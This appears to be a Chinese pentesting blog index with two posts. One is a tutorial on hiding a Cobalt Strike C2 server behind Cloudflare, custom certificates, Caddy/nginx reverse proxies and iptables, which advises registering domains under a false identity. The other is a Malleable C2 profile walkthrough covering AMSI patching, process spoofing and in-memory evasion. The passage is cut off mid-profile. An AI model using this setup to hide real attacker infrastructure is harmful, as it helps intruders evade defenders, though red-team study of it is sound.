[{"categories":["Pentesting"],"content":"CS特征隐藏和C2的地址隐藏，简单整理以作备忘。","date":"2024-02-12","objectID":"/2024/02/c2%E9%9A%90%E8%97%8F%E9%9A%8F%E7%AC%94/","tags":["C2"],"title":"CS隐藏随笔","uri":"/2024/02/c2%E9%9A%90%E8%97%8F%E9%9A%8F%E7%AC%94/"},{"categories":["Pentesting"],"content":"记录下CS的特征去除、流量加密和IP隐藏的流程，以作备忘。 前言 简单记录下C2的常规隐藏手法，以Cobalt Strike 4.9.1为例。 前期需要准备的东西： vps 域名 cdn账号 端口特征修改 在teamserver文件中，给CS配置的默认端口为50050，我们可以根据需要修改为自己需要的端口号： 证书特征修改 Cobalt Strike默认使用的证书有三个： cobaltstrike.store：用于server和client的通信加密 proxy.store：用于浏览器代理，client中的browser pivot功能 ssl.store：假设在c2.profile配置文件中没有配置http-certificate选项，并且listener使用的是https，CS就会使用这个默认的证书文件。 cobaltstrike.store和ssl.store特征十分明显，已被厂商标记烂了，所以需要自生成替换掉这俩默认的证书。而且，默认使用的密码为123456. 这里使用的工具是keytool，一个Java数据证书的管理工具，keytool会将密钥(key)和证书(certificates)保存在一个keystore的文件中，后缀为.store。keytool可以用于生成新的.store，也可以用于查看.store的内容。 默认的cobaltstrike.store文件的内容： 假设使用下面的命令进行特征取出： keytool -keystore cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias 360.cn -dname \"CN=360, OU=360.cn, O=Sofaware,L=Somewhere,ST=Cyberspace, C=CN\" # 参数说明如下# -keytool -keystore cobaltstrike.store -storepass 密码# -keypass 密码# -genkey -keyalg RSA# -alias google.com -dname CN=(名字与姓氏),# OU=(组织单位名称), O=(组织名称),# L=(城市或区域名称),# ST=(州或省份名称),# C=(单位的两字母国家代码)。 去除特征后的内容如下： 但是这种方式并不推荐，我们还可以引入第三方证书来进行设置。 这里的证书将结合后面的cdn部分一起进行配置，主要是使用第三方的证书来去除特征，详细的配置步骤放在cdn配置部分中。 流量特征修改 ","date":"2024-02-12","objectID":"/2024/02/c2%E9%9A%90%E8%97%8F%E9%9A%8F%E7%AC%94/:0:0","tags":["C2"],"title":"CS隐藏随笔","uri":"/2024/02/c2%E9%9A%90%E8%97%8F%E9%9A%8F%E7%AC%94/"},{"categories":["Pentesting"],"content":"域名 申请域名到https://www.namesilo.com，比较便宜，支持支付宝支付，注册可以使用临时邮箱和虚假身份。 购买完成后，进入Domain Manger，在自己的域名的最后的option部分，点击卡车图标，可以看到分配的DNS解析记录： 我们进入前面的图标，把默认解析记录给删除掉。 ","date":"2024-02-12","objectID":"/2024/02/c2%E9%9A%90%E8%97%8F%E9%9A%8F%E7%AC%94/:1:0","tags":["C2"],"title":"CS隐藏随笔","uri":"/2024/02/c2%E9%9A%90%E8%97%8F%E9%9A%8F%E7%AC%94/"},{"categories":["Pentesting"],"content":"cdn配置 这里使用cloud flare的免费级别的cdn加速即可。 首先绑定域名： 输入前面获取的域名，选择最下面的免费计划， 进入站点后，点击左侧的dns，查看Cloud Flare的DNS，记录下两个ns记录： 回到namesilo网站， 进入Domain Manager，点击红框中的图标，设置DNS Server： 把Cloud Flare的两条NS记录添加上： 这样就实现了将自己的域名的所有解析功能都托管在Cloud Flare上，从而实现利用CDN的解析。 回到Cloud Flare的管理页面，添加两条DNS解析记录，IPv4地址写自己的vps服务器的外网ip： 这两条记录有一个是www，另外一个随意。 然后在规则-\u003e页面规则添加两条规则，url分别为*.域名/*、.域名/*，选取设置为缓存级别，级别为绕过: 等待Cloud Flare的CDN配置生效，时间大概在十几分钟到一个小时，可以查看cf的注册邮箱是否收到邮件。 激活成功后，可以ping一下自己的域名： 此时获得ip信息已经不是vps的外网ip，也可以多地ping检查一下： ","date":"2024-02-12","objectID":"/2024/02/c2%E9%9A%90%E8%97%8F%E9%9A%8F%E7%AC%94/:2:0","tags":["C2"],"title":"CS隐藏随笔","uri":"/2024/02/c2%E9%9A%90%E8%97%8F%E9%9A%8F%E7%AC%94/"},{"categories":["Pentesting"],"content":"证书和密钥 直接使用cloud flare创建证书和密钥，用于后续的加密通信。 创建证书，如下图： 生成之后，保存到本地的*.pem和*.key文件。 然后使用如下命令先生成certout.p12，再生成新的.store： openssl pkcs12 -export -in 保存的源证书.pem -inkey 保存的私钥.key -out 输出的p12文件名(自定义).p12 -name 设置别名 -passout pass:设置密码 keytool -importkeystore -deststorepass 设置密码 -destkeypass 设置密码 -destkeystore 设置证书文件名.store -srckeystore 上面自定义的p12文件.p12 -srcstoretype PKCS12 -srcstorepass 上面设置的密码 -alias 设置别名 eg： openssl pkcs12 -export -in cert.pem -inkey secret.key -out certout.p12 -name cloudflare_cert -passout pass:753015 keytool -importkeystore -deststorepass 753015 -destkeypass 753015 -destkeystore bk.store -srckeystore certout.p12 -srcstoretype PKCS12 -srcstorepass 753015 -alias cloudflare_cert 生成.store文件后，修改teamserver文件中的启动命令中对应的值，密码也直接修改。 这里需要记得开启SSL/TLS协议： 在浏览器到Cloud Flare和Cloud Flare到源服务器之间都需要开启SSL/TLS。我这里设置的是自签名的证书，因为前面都是我们自己生成的。 ","date":"2024-02-12","objectID":"/2024/02/c2%E9%9A%90%E8%97%8F%E9%9A%8F%E7%AC%94/:3:0","tags":["C2"],"title":"CS隐藏随笔","uri":"/2024/02/c2%E9%9A%90%E8%97%8F%E9%9A%8F%E7%AC%94/"},{"categories":["Pentesting"],"content":"修改c2 profile文件 将random_c2profile项目生成随机profile进行二次修改 项目地址：https://github.com/threatexpress/random_c2_profile （后续将根据情况再单独出profile文件的详细配置内容。） 将生成的证书信息填写： 这里的keystore部分填写前面证书生成的.store文件；password部分需要与teamserver中的一致。 修改host-stager： 修改http-config： 修改http-get 修改http-post 修改完成后，使用./c2lint [profile]进行文件检查，没有错误就可以使用了。 注意： 1、http-get和http-post的Content-Type需要设置为\"application/*; charset=utf-8\"否则无法命令执行。 2、由于配置caddy需要匹配/js/query-3.*路径，所以http-get和http-post需设置成/js/query-3.*一样的路径，否则无法正常上线。 3、免费版的Cloud Flare对代理的端口有限制，只能改成如下端口： http：80、8080、8880、2052、2082、2086、2095 https：443、2053、2083、2087、2096、8443 反向代理 使用反向代理的目的是隐藏C2，虽然加了CDN，但是直接请求到server还是有点不安稳，nmap的一些扫描脚本可以直接扫描出来，所以还是要加一个反向代理，这样类似腾讯云、阿里云的风控也能绕过了。 ","date":"2024-02-12","objectID":"/2024/02/c2%E9%9A%90%E8%97%8F%E9%9A%8F%E7%AC%94/:4:0","tags":["C2"],"title":"CS隐藏随笔","uri":"/2024/02/c2%E9%9A%90%E8%97%8F%E9%9A%8F%E7%AC%94/"},{"categories":["Pentesting"],"content":"caddy 使用简单、快速配置，地址https://github.com/caddyserver/caddy 安装完成后，在/etc/caddy文件夹下有一个Caddyfile文件，这个是默认的配置文件，我们编辑一下： [域名] { tls /root/tools/Server/[证书文件].pem /root/tools/Server/[密钥].key reverse_proxy /js/jquery-3.* https://127.0.0.1:8443 { # 端口可以自己设置转发的端口，uri需要与c2 profile中的一致 # 把对/js/jquery-3.*的请求转发到本地的8443端口 transport http { tls tls_insecure_skip_verify } header_up X-Forwarded-For {http.request.header.X-Forwarded-For} } header /* { Server \"Caddy\" \"Tengine\" } } 修改完成后，在/etc/caddy路径下启动caddy： caddy run 也可以指定配置文件： caddy run --config /etc/caddy/Caddyfile 启动成功后，反代配置完成。 ","date":"2024-02-12","objectID":"/2024/02/c2%E9%9A%90%E8%97%8F%E9%9A%8F%E7%AC%94/:5:0","tags":["C2"],"title":"CS隐藏随笔","uri":"/2024/02/c2%E9%9A%90%E8%97%8F%E9%9A%8F%E7%AC%94/"},{"categories":["Pentesting"],"content":"nginx nginx的配置与caddy基本一样，也是将本地的443端口流量转发到本地的8443端口并匹配路径为/js/jquery-3.*： http { server { listen 443 ssl; server_name [域名]; ssl_certificate /root/tools/Server/[证书文件].pem; ssl_certificate_key /root/tools/Server/[密钥].key; location ~* /js/jquery-3. { if ($host != \"[域名]\") { return 403; } if ($http_user_agent != \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36\") { return 403; } proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass https://127.0.0.1:8443; } } } 需要注意的是，这里配置了UA，否则返回403。 ","date":"2024-02-12","objectID":"/2024/02/c2%E9%9A%90%E8%97%8F%E9%9A%8F%E7%AC%94/:6:0","tags":["C2"],"title":"CS隐藏随笔","uri":"/2024/02/c2%E9%9A%90%E8%97%8F%E9%9A%8F%E7%AC%94/"},{"categories":["Pentesting"],"content":"iptables 因为设置了端口转发，443-\u003e8443，所以需要设置一下iptabes，把对8443端口的访问限制在本机： iptables -A INPUT -s 127.0.0.1 -p tcp --dport 8443 -j ACCEPT iptables -A INPUT -p tcp --dport 8443 -j DROP 只允许本机访问8443: 上线效果 上述工作都完成后，CS可以成功上线，并且通信加密，nmap也扫描不出来。 补充 ","date":"2024-02-12","objectID":"/2024/02/c2%E9%9A%90%E8%97%8F%E9%9A%8F%E7%AC%94/:7:0","tags":["C2"],"title":"CS隐藏随笔","uri":"/2024/02/c2%E9%9A%90%E8%97%8F%E9%9A%8F%E7%AC%94/"},{"categories":["Pentesting"],"content":"1. 端口限制 如果是国内的VPS，对于常见的80、8080、443、8443端口可能无法直接使用，所以需要使用一些非常见的端口。 而且免费版本的Cloud Flare对能使用的端口有限制： http：80、8080、8880、2052、2082、2086、2095 https：443、2053、2083、2087、2096、8443 所以如果80、8080、443、8443用不了，就可以用2052，2087这种端口。 ","date":"2024-02-12","objectID":"/2024/02/c2%E9%9A%90%E8%97%8F%E9%9A%8F%E7%AC%94/:8:0","tags":["C2"],"title":"CS隐藏随笔","uri":"/2024/02/c2%E9%9A%90%E8%97%8F%E9%9A%8F%E7%AC%94/"},{"categories":["Pentesting"],"content":"2. http上线 以上针对的是https的beacon，http的话在DNS中加一个二级域名并使用该二级域名上线即可。不用额外再弄一个profile，因为http的beacon只看域名。 在http的raw payload中我们可以验证这一点： 对比https的raw payload，它用上了我们之前配置的所有内容： ","date":"2024-02-12","objectID":"/2024/02/c2%E9%9A%90%E8%97%8F%E9%9A%8F%E7%AC%94/:9:0","tags":["C2"],"title":"CS隐藏随笔","uri":"/2024/02/c2%E9%9A%90%E8%97%8F%E9%9A%8F%E7%AC%94/"},{"categories":["Pentesting"],"content":"3. CF不支持域前置 Cloudflare目前已经不支持域前置，所以上面的操作只能隐藏真实的ip，但是无法隐藏C2使用的域名，会在流量的Host字段中显示出来。AWS 的CloudFront目前也已经不再支持。 有一种类似于Domain Fronting的方法。就是使用一个同样接入了CloudFlare，与目标域名指向相同IP但没有被墙的域名作为SNI。前提是必须要有而且知道这个域名。 域前置Domain Fronting https://evi1cg.me/archives/Domain_Fronting.html https://www.bamsoftware.com/papers/fronting/ ","date":"2024-02-12","objectID":"/2024/02/c2%E9%9A%90%E8%97%8F%E9%9A%8F%E7%AC%94/:10:0","tags":["C2"],"title":"CS隐藏随笔","uri":"/2024/02/c2%E9%9A%90%E8%97%8F%E9%9A%8F%E7%AC%94/"},{"categories":["Pentesting"],"content":"CS基础知识记录","date":"2024-01-17","objectID":"/2024/01/cobalt_strike_basic_no.3/","tags":["C2"],"title":"Cobalt Strike Basic No.3 -- Malleable C2 Profile","uri":"/2024/01/cobalt_strike_basic_no.3/"},{"categories":["Pentesting"],"content":"Cobalt Strike的Malleable C2 Profile文件的组织结构和介绍。 ","date":"2024-01-17","objectID":"/2024/01/cobalt_strike_basic_no.3/:0:0","tags":["C2"],"title":"Cobalt Strike Basic No.3 -- Malleable C2 Profile","uri":"/2024/01/cobalt_strike_basic_no.3/"},{"categories":["Pentesting"],"content":"Malleable C2 Profile beacon的http通信方式是由Malleable C2 Profile来控制的，它可以指定如何传输和保存数据。每个CS只能加载一个profile。在加载profile之前，使用c2lint对profile进行错误检查。 通过修改profile中的各种值，就可以实现修改beacon的内存占用、修改网络流量等。 使用命令： ./teamserver [external IP] [password] [/path/to/my.profile] 检查错误： ./c2lint [/path/to/my.profile] c2lint returns and logs the following result codes for the specified profile file: A result of 0 is returned if c2lint completes with no errors A result of 1 is returned if c2lint completes with only warnings A result of 2 is returned if c2lint completes with only errors A result of 3 is returned if c2lint completes with both errors and warnings 下面使用https://github.com/threatexpress/malleable-c2的profile作为示例来详细说明profile的相关结构内容，该profile旨在模拟jQuery请求。 ","date":"2024-01-17","objectID":"/2024/01/cobalt_strike_basic_no.3/:1:0","tags":["C2"],"title":"Cobalt Strike Basic No.3 -- Malleable C2 Profile","uri":"/2024/01/cobalt_strike_basic_no.3/"},{"categories":["Pentesting"],"content":"Profile Name ################################################ ## Profile Name ################################################ ## Description: ## The name of this profile (used in the Indicators of Compromise report) ## Defaults: ## sample_name: My Profile ## Guidelines: ## - Choose a name that you want in a report set sample_name \"jQuery CS 4.9 Profile\"; profile name不会影响beacon的流量或者其在目标上的占用空间，而是会在最后的报告中看到使用的profile名字。 ","date":"2024-01-17","objectID":"/2024/01/cobalt_strike_basic_no.3/:1:1","tags":["C2"],"title":"Cobalt Strike Basic No.3 -- Malleable C2 Profile","uri":"/2024/01/cobalt_strike_basic_no.3/"},{"categories":["Pentesting"],"content":"sleep time ################################################ ## Sleep Times ################################################ ## Description: ## Timing between beacon check in ## Defaults: ## sleeptime: 60000 ## jitter: 0 ## Guidelines: ## - Beacon Timing in milliseconds (1000 = 1 sec) set sleeptime \"45000\"; # 45 Seconds #set sleeptime \"300000\"; # 5 Minutes #set sleeptime \"600000\"; # 10 Minutes #set sleeptime \"900000\"; # 15 Minutes #set sleeptime \"1200000\"; # 20 Minutes #set sleeptime \"1800000\"; # 30 Minutes #set sleeptime \"3600000\"; # 1 Hours set jitter \"37\"; # % jitter 设置beacon的check in的时间，毫秒为单位。在生成新的http/s beacon时，会使用sleep时间作为其回调时间间隔进行check in，然后再加上由jitter（抖动）指定的随机事件。 ","date":"2024-01-17","objectID":"/2024/01/cobalt_strike_basic_no.3/:1:2","tags":["C2"],"title":"Cobalt Strike Basic No.3 -- Malleable C2 Profile","uri":"/2024/01/cobalt_strike_basic_no.3/"},{"categories":["Pentesting"],"content":"User-Agent ################################################ ## Beacon User-Agent ################################################ ## Description: ## User-Agent string used in HTTP requests, CS versions \u003c 4.2 approx 128 max characters, CS 4.2+ max 255 characters ## Defaults: ## useragent: Internet Explorer (Random) ## Guidelines ## - Use a User-Agent values that fits with your engagement ## - useragent can only be 128 chars ## IE 10 # set useragent \"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)\"; ## MS IE 11 User Agent set useragent \"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\"; 实战时，可以尝试从目标捕获一个真实的ua值并插入流量中。例如，向目标发送一封袋有web漏洞的电子邮件并监控后续get请求中发送的ua值。如果使用的是明文的http琉璃那个或者目标环境中存在ssl拦截，那么与环境不匹配的ua就会被目标发现。 ","date":"2024-01-17","objectID":"/2024/01/cobalt_strike_basic_no.3/:1:3","tags":["C2"],"title":"Cobalt Strike Basic No.3 -- Malleable C2 Profile","uri":"/2024/01/cobalt_strike_basic_no.3/"},{"categories":["Pentesting"],"content":"SSL证书 ################################################ ## SSL CERTIFICATE ################################################ ## Description: ## Signed or self-signed TLS/SSL Certifcate used for C2 communication using an HTTPS listener ## Defaults: ## All certificate values are blank ## Guidelines: ## - Best Option - Use a certifcate signed by a trusted certificate authority ## - Ok Option - Create your own self signed certificate ## - Option - Set self-signed certificate values https-certificate { ## Option 1) Trusted and Signed Certificate ## Use keytool to create a Java Keystore file. ## Refer to https://www.cobaltstrike.com/help-malleable-c2#validssl ## or https://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/HTTPsC2DoneRight.sh ## Option 2) Create your own Self-Signed Certificate ## Use keytool to import your own self signed certificates #set keystore \"/pathtokeystore\"; #set password \"password\"; ## Option 3) Cobalt Strike Self-Signed Certificate set C \"US\"; set CN \"jquery.com\"; set O \"jQuery\"; set OU \"Certificate Authority\"; set validity \"365\"; } 设置https beacon通信使用的TLS/SSL证书。这里官方给出的建议是可以使用keytool生成一个java的keystore文件，或者生成一个自签名的证书。其中set keystore指定使用的*.store文件，set password指定生成证书时设置的密码。详细的证书生成可以参考CS隐藏随笔。 ","date":"2024-01-17","objectID":"/2024/01/cobalt_strike_basic_no.3/:1:4","tags":["C2"],"title":"Cobalt Strike Basic No.3 -- Malleable C2 Profile","uri":"/2024/01/cobalt_strike_basic_no.3/"},{"categories":["Pentesting"],"content":"HTTP Beacon ################################################ ## HTTP Beacon ################################################ ## Description: ## Allows you to specify attributes for general attributes for the http(s) beacons. ## Values: ## library wininet CS 4.9 - The library attribute allows user to specify the default library used by the generated beacons used by the profile. The library defaults to \"wininet\", which is the only type of beacon prior to version 4.9. The library value can be \"wininet\" or \"winhttp\". ## http-beacon { # Change the default HTTP Beacon library type used by the generated beacons set library \"winhttp\"; } 指定http beacon使用的library，4.9版本支持wininet和winhttp两种，默认使用winhttp。 ","date":"2024-01-17","objectID":"/2024/01/cobalt_strike_basic_no.3/:1:5","tags":["C2"],"title":"Cobalt Strike Basic No.3 -- Malleable C2 Profile","uri":"/2024/01/cobalt_strike_basic_no.3/"},{"categories":["Pentesting"],"content":"TCP Beacon ################################################ ## TCP Beacon ################################################ ## Description: ## TCP Beacon listen port ## - https://blog.cobaltstrike.com/2019/01/02/cobalt-strike-3-13-why-do-we-argue/ ## - https://www.cobaltstrike.com/help-tcp-beacon ## TCP Frame Header ## - Added in CS 4.1, prepend header to TCP Beacon messages ## Defaults: ## tcp_port: 4444 ## tcp_frame_header: N\\A ## Guidelines ## - OPSEC WARNING!!!!! The default port is 4444. This is bad. You can change dynamicaly but the port set in the profile will always be used first before switching to the dynamic port. ## - Use a port other that default. Choose something not is use. ## - Use a port greater than 1024 is generally a good idea set tcp_port \"42585\"; set tcp_frame_header \"\\x80\"; 设置tcp beacon的端口和tcp帧的header字节。 ","date":"2024-01-17","objectID":"/2024/01/cobalt_strike_basic_no.3/:1:6","tags":["C2"],"title":"Cobalt Strike Basic No.3 -- Malleable C2 Profile","uri":"/2024/01/cobalt_strike_basic_no.3/"},{"categories":["Pentesting"],"content":"SMB Beacon ################################################ ## SMB beacons ################################################ ## Description: ## Peer-to-peer beacon using SMB for communication ## SMB Frame Header ## - Added in CS 4.1, prepend header to SMB Beacon messages ## Defaults: ## pipename: msagent_## ## pipename_stager: status_## ## smb_frame_header: N\\A ## Guidelines: ## - Do not use an existing namedpipe, Beacon doesn't check for conflict! ## - the ## is replaced with a number unique to a teamserver ## --------------------- set pipename \"mojo.5688.8052.183894939787088877##\"; # Common Chrome named pipe set pipename_stager \"mojo.5688.8052.35780273329370473##\"; # Common Chrome named pipe set smb_frame_header \"\\x80\"; 配置pipe的名字和smb帧的header字节。SMB Beacon使用pipe通过父beacon进行通信，实现在同一主机或者网络上的beacon直接进行点对点通信。 ","date":"2024-01-17","objectID":"/2024/01/cobalt_strike_basic_no.3/:1:7","tags":["C2"],"title":"Cobalt Strike Basic No.3 -- Malleable C2 Profile","uri":"/2024/01/cobalt_strike_basic_no.3/"},{"categories":["Pentesting"],"content":"DNS Beacon ################################################ ## DNS beacons ################################################ ## Description: ## Beacon that uses DNS for communication ## Defaults: ## dns_idle: 0.0.0.0 ## dns_max_txt: 252 ## dns_sleep: 0 ## dns_stager_prepend: N/A ## dns_stager_subhost: .stage.123456. ## dns_ttl: 1 ## maxdns: 255 ## beacon: N/A ## get_A: cdn. ## get_AAAA: www6. ## get_TXT: api. ## put_metadata: www. ## put_output: post. ## ns_reponse: drop ## Guidelines: ## - DNS beacons generate a lot of DNS request. DNS beacon are best used as low and slow back up C2 channels dns-beacon { # Options moved into \"dns-beacon\" group in version 4.3 set dns_idle \"74.125.196.113\"; #google.com (change this to match your campaign) set dns_max_txt \"252\"; set dns_sleep \"0\"; # Force a sleep prior to each individual DNS request. (in milliseconds) set dns_ttl \"5\"; set maxdns \"255\"; set dns_stager_prepend \".resources.123456.\"; set dns_stager_subhost \".feeds.123456.\"; # DNS subhosts override options, added in version 4.3 set beacon \"a.bc.\"; set get_A \"b.1a.\"; set get_AAAA \"c.4a.\"; set get_TXT \"d.tx.\"; set put_metadata \"e.md.\"; set put_output \"f.po.\"; set ns_response \"zero\"; } 配置DNS的解析等内容，文档说明比较明显，基本不用修改。 ","date":"2024-01-17","objectID":"/2024/01/cobalt_strike_basic_no.3/:1:8","tags":["C2"],"title":"Cobalt Strike Basic No.3 -- Malleable C2 Profile","uri":"/2024/01/cobalt_strike_basic_no.3/"},{"categories":["Pentesting"],"content":"Staging process ################################################ ## Staging process ################################################ ## OPSEC WARNING!!!! Staging has serious OPSEC issues. It is recommed to disable staging and use stageless payloads ## Description: ## Malleable C2's http-stager block customizes the HTTP staging process ## Defaults: ## uri_x86 Random String ## uri_x64 Random String ## HTTP Server Headers - Basic HTTP Headers ## HTTP Client Headers - Basic HTTP Headers ## Guidelines: ## - Add customize HTTP headers to the HTTP traffic of your campaign ## - Only specify the `Host` header when peforming domain fronting. Be aware of HTTP proxy's rewriting your request per RFC2616 Section 14.23 ## - https://blog.cobaltstrike.com/2017/02/06/high-reputation-redirectors-and-domain-fronting/ ## - Note: Data transform language not supported in http stageing (mask, base64, base64url, etc) #set host_stage \"false\"; # Do not use staging. Must use stageles payloads, now the default for Cobalt Strike built-in processes set host_stage \"true\"; # Host payload for staging over HTTP, HTTPS, or DNS. Required by stagers.set http-stager { set uri_x86 \"/jquery-3.3.1.slim.min.js\"; set uri_x64 \"/jquery-3.3.2.slim.min.js\"; server { header \"Server\" \"NetDNA-cache/2.2\"; header \"Cache-Control\" \"max-age=0, no-cache\"; header \"Pragma\" \"no-cache\"; header \"Connection\" \"keep-alive\"; header \"Content-Type\" \"application/javascript; charset=utf-8\"; output { ## The javascript was changed. Double quotes and backslashes were escaped to properly render (Refer to Tips for Profile Parameter Values) # 2nd Line prepend \"!function...省略...P=\\\"\\r\"; # 1st Line prepend \"/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */\"; append \"\\\".(o=t.documentElement...省略...(e.jQuery=e.$=w),w});\"; print; } } client { header \"Accept\" \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\"; header \"Accept-Language\" \"en-US,en;q=0.5\"; #header \"Host\" \"code.jquery.com\"; header \"Referer\" \"http://code.jquery.com/\"; header \"Accept-Encoding\" \"gzip, deflate\"; } } 设置staging相关内容，但是OPSEC建议使用stageless的payload，目的是减少通信，一次上钩，防止被安全防护产品报警。但是实战里面还是存在staging的场景。该部分可以设置stager的各种特性，模仿单个合法的http请求/响应。 在此示例中，请求将发送到/jquery-3.3.1.slim.min.js或者/jquery-3.3.2.slim.min.js，然后开始staging过程。构建http服务器参数以模仿jQuery请求。Beacon命令和payload会被混合到jQuery的javascript文本块中。从CDN请求jQuery时，客户端发出一个合理的请求： \u003cscript src =“jquery-3.3.1.min.js”\u003e \u003c/ script\u003e 可以把uri修改为类似其他CDN的形式，例如可以修改http-stager，模仿Microsoft jQuery： \u003cscript src =“https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js”\u003e \u003c/script\u003e ","date":"2024-01-17","objectID":"/2024/01/cobalt_strike_basic_no.3/:1:9","tags":["C2"],"title":"Cobalt Strike Basic No.3 -- Malleable C2 Profile","uri":"/2024/01/cobalt_strike_basic_no.3/"},{"categories":["Pentesting"],"content":"Post Exploitation ################################################ ## Post Exploitation ################################################ ## Description: ## Controls post-exploitation jobs, including default x86/x64 program to open and inject shellcode into, AMSI bypass for execute-assembly, powerpick, and psinject ## https://www.cobaltstrike.com/help-malleable-postex ## Values: ## spawnto_x86 %windir%\\\\syswow64\\\\rundll32.exe ## spawnto_x64 %windir%\\\\sysnative\\\\rundll32.exe ## obfuscate false CS 3.14 - Scrambles the content of the post-ex DLLs and settles the post-ex capability into memory in a more OPSEC-safe way ## pipename postex_####, windows\\\\pipe_## CS 4.2 - Change the named pipe names used, by post-ex DLLs, to send output back to Beacon. This option accepts a comma-separated list of pipenames. Cobalt Strike will select a random pipe name from this option when it sets up a post-exploitation job. Each # in the pipename is replaced with a valid hex character as well. ## smartinject false CS 3.14 added to postex block - Directs Beacon to embed key function pointers, like GetProcAddress and LoadLibrary, into its same-architecture post-ex DLLs. ## amsi_disable false CS 3.13 - Directs powerpick, execute-assembly, and psinject to patch the AmsiScanBuffer function before loading .NET or PowerShell code. This limits the Antimalware Scan Interface visibility into these capabilities. ## keylogger GetAsyncKeyState CS 4.2 - The GetAsyncKeyState option (default) uses the GetAsyncKeyState API to observe keystrokes. The SetWindowsHookEx option uses SetWindowsHookEx to observe keystrokes. ## threadhint CS 4.2 - allows multi-threaded post-ex DLLs to spawn threads with a spoofed start address. Specify the thread hint as \"module!function+0x##\" to specify the start address to spoof. The optional 0x## part is an offset added to the start address. ## cleanup false CS 4.9 - Cleans up the post-ex UDRL memory when the post-ex DLL is loaded. ## Guidelines ## - spawnto can only be 63 chars ## - OPSEC WARNING!!!! The spawnto in this example will contain identifiable command line strings ## - sysnative for x64 and syswow64 for x86 ## - Example x64 : C:\\\\Windows\\\\sysnative\\\\w32tm.exe ## Example x86 : C:\\\\Windows\\\\syswow64\\\\w32tm.exe ## - The binary doesnt do anything wierd (protected binary, etc) ## - !! Don't use these !! ## - \"csrss.exe\",\"logoff.exe\",\"rdpinit.exe\",\"bootim.exe\",\"smss.exe\",\"userinit.exe\",\"sppsvc.exe\" ## - A binary that executes without the UAC ## - 64 bit for x64 ## - 32 bit for x86 ## - You can add command line parameters to blend ## - set spawnto_x86 \"%windir%\\\\syswow64\\\\svchost.exe -k netsvcs\"; ## - set spawnto_x64 \"%windir%\\\\sysnative\\\\svchost.exe -k netsvcs\"; ## - Note: svchost.exe may look weird as the parent process ## - The obfuscate option scrambles the content of the post-ex DLLs and settles the post-ex capability into memory in a more OPSEC-safe way. It’s very similar to the obfuscate and userwx options available for Beacon via the stage block. ## - The amsi_disable option directs powerpick, execute-assembly, and psinject to patch the AmsiScanBuffer function before loading .NET or PowerShell code. This limits the Antimalware Scan Interface visibility into these capabilities. ## - The smartinject option directs Beacon to embed key function pointers, like GetProcAddress and LoadLibrary, into its same-architecture post-ex DLLs. This allows post-ex DLLs to bootstrap themselves in a new process without shellcode-like behavior that is detected and mitigated by watching memory accesses to the PEB and kernel32.dll post-ex { # Optionally specify non-existent filepath to force manual specification based on the Beacon host's running processes set spawnto_x86 \"%windir%\\\\syswow64\\\\dllhost.exe\"; # Hardcode paths like C:\\\\Windows\\\\System32\\\\dllhost.exe to avoid potential detections for %SYSNATIVE% use. !! This will break when attempting to spawn a 64bit post-ex job from a 32bit Beacon. set spawnto_x64 \"%windir%\\\\sysnative\\\\dllhost.exe\"; # ","date":"2024-01-17","objectID":"/2024/01/cobalt_strike_basic_no.3/:1:10","tags":["C2"],"title":"Cobalt Strike Basic No.3 -- Malleable C2 Profile","uri":"/2024/01/cobalt_strike_basic_no.3/"},{"categories":["Pentesting"],"content":"Memory Indicator ################################################ ## Memory Indicators ################################################ ## Description: ## The stage block in Malleable C2 profiles controls how Beacon is loaded into memory and edit the content of the Beacon Reflective DLL. ## Values: ## allocator VirtualAlloc CS 4.2 - Set how Beacon's Reflective Loader allocates memory for the agent. Options are: HeapAlloc, MapViewOfFile, and VirtualAlloc ## checksum 0 The CheckSum value in Beacon's PE header ## cleanup false Ask Beacon to attempt to free memory associated with the Reflective DLL package that initialized it. ## compile_time 14 July 2009 8:14:00 The build time in Beacon's PE header ## entry_point 92145 The EntryPoint value in Beacon's PE header ## image_size_x64 512000 SizeOfImage value in x64 Beacon's PE header ## image_size_x86 512000 SizeOfImage value in x86 Beacon's PE header ## magic_mz_x86 MZRE CS 4.2 - Override the first bytes (MZ header included) of Beacon's Reflective DLL. Valid x86 instructions are required. Follow instructions that change CPU state with instructions that undo the change. ## magic_mz_x64 MZAR CS 4.2 - Same as magic_mz_x86; affects x64 DLL. ## module_x64 xpsservices.dll Same as module_x86; affects x64 loader ## module_x86 xpsservices.dll Ask the x86 ReflectiveLoader to load the specified library and overwrite its space instead of allocating memory with VirtualAlloc. ## magic_pe PE Override the PE character marker used by Beacon's Reflective Loader with another value. ## name beacon.x64.dll The Exported name of the Beacon DLL ## obfuscate false Obfuscate the Reflective DLL's import table, overwrite unused header content, and ask ReflectiveLoader to copy Beacon to new memory without its DLL headers. As of 4.2 CS now obfuscates .text section in rDLL package ## rich_header N/A Meta-information inserted by the compiler ## sleep_mask false CS 3.12 - Obfuscate Beacon (HTTP, SMB, TCP Beacons), in-memory, prior to sleeping (HTTP) or waiting for a new connection\\data (SMB\\TCP) ## smartinject false CS 4.1 added to stage block - Use embedded function pointer hints to bootstrap Beacon agent without walking kernel32 EAT ## stomppe true Ask ReflectiveLoader to stomp MZ, PE, and e_lfanew values after it loads Beacon payload ## userwx false Ask ReflectiveLoader to use or avoid RWX permissions for Beacon DLL in memory ## Guidelines: ## - Modify the indicators to minimize in memory indicators ## - Refer to ## https://blog.cobaltstrike.com/2018/02/08/in-memory-evasion/ ## https://www.youtube.com/playlist?list=PL9HO6M_MU2nc5Q31qd2CwpZ8J4KFMhgnK ## https://www.youtube.com/watch?v=AV4XjxYe4GM (Obfuscate and Sleep) stage { # CS 4.2 added allocator and MZ header overrides set allocator \"VirtualAlloc\"; # Options are: HeapAlloc, MapViewOfFile, and VirtualAlloc #set magic_mz_x86 \"MZRE\"; #set magic_mz_x64 \"MZAR\"; set magic_pe \"NO\"; set userwx \"false\"; set stomppe \"true\"; set obfuscate \"true\"; set 